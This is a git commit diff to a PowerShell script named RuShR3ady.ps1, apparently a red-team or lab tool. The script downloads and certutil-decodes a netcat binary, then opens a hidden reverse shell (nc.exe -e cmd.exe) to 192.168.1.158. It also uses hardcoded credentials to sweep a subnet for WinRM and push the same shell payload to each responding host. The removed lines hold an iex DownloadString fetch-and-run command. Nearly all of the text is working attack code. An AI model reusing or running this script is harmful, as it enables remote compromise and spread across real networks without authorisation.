62e2c4e2d35340ebee054c525ef582806514481a
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-05-11 16:31:51 +0100

    Update RuShR3ady.ps1

--- RuShR3ady.ps1
+++ RuShR3ady.ps1
@@ -1,35 +1,34 @@
-#example
-powershell calc.exe
-
 Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
 certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
 
 $b = 0
-$p = 4444
-$tst = $false
+$port = 4444
+$tst = "f"
+$atk = "192.168.1.158"
 
-while ($b -lt 4 -and $tst -eq $false) {
+while ($b -lt 4 -and $tst -ne "t") {
 
-$an = (Test-NetConnection $atk -Port $p -ErrorAction SilentlyContinue).TcpTestSucceeded
+$an = (Test-NetConnection $atk -Port $port -ErrorAction SilentlyContinue).TcpTestSucceeded
+
 
 if ($an -eq $true){
-$tst = $true
+
 Start-Sleep -Seconds 20
-Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe 192.168.1.158 $p -e cmd.exe"
+& powershell -nop -w hidden $env:TEMP\nc.exe 192.168.1.158 $port -e cmd.exe
+
+$tst = "t"
 
 }
-$p++
+
+$port++
 $b++
 
 
 }
 
 
-
-
 $u = "morty"
 $p = "P@ssw0rd"
-
 $atk = "192.168.1.158"
 
 $secpassword = ConvertTo-SecureString $p -AsPlainText -Force
@@ -49,8 +48,8 @@ $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpa
     if ($isdot = $subnetrange.EndsWith('.') -eq $false){$subnetrange = $subnetrange + '.'}
     
     
-    #$iprange = @(1..254)
-    $iprange = @(102)
+    $iprange = @(1..254)
+    
      
     foreach ($i in $iprange){
 
@@ -62,22 +61,46 @@ $result = $TCPObject.ConnectAsync($currentip, '5985').Wait(50)
 
 if ($result -eq $true){
 
-$islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotiate -ErrorAction SilentlyContinue
+$islive = Test-WSMan $currentip -Credential $mycredential -Authentication Negotiate -ErrorAction SilentlyContinue
 
 if ($islive -ne $null){
 
-# **************** what if you just run a powershell invoke for each ********************
 
-invoke..........& powershell
+Invoke-Command -ComputerName $currentip -Credential $mycredential -ScriptBlock {
 
-New-Item -Path $env:TEMP -Name "john.ps1"
-Add-Content $env:TEMP\john.ps1 -Value 'powershell -nop -w hidden iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1")'
-Invoke-Command -ComputerName $currentip -Credential $mycredential -FilePath $env:TEMP\john.ps1
+Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
+certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
+
+$b = 0
+$port = 4444
+$tst = "f"
+$atk = "192.168.1.158"
+
+while ($b -lt 4 -and $tst -ne "t") {
+
+$an = (Test-NetConnection $atk -Port $port -ErrorAction SilentlyContinue).TcpTestSucceeded
+
+
+if ($an -eq $true){
+
+Start-Sleep -Seconds 20
+& powershell -nop -w hidden $env:TEMP\nc.exe 192.168.1.158 $port -e cmd.exe
+
+$tst = "t"
+
+}
+
+$port++
+$b++
+
 
 }
 
 }
 
+}
+
+}
 
 }
 
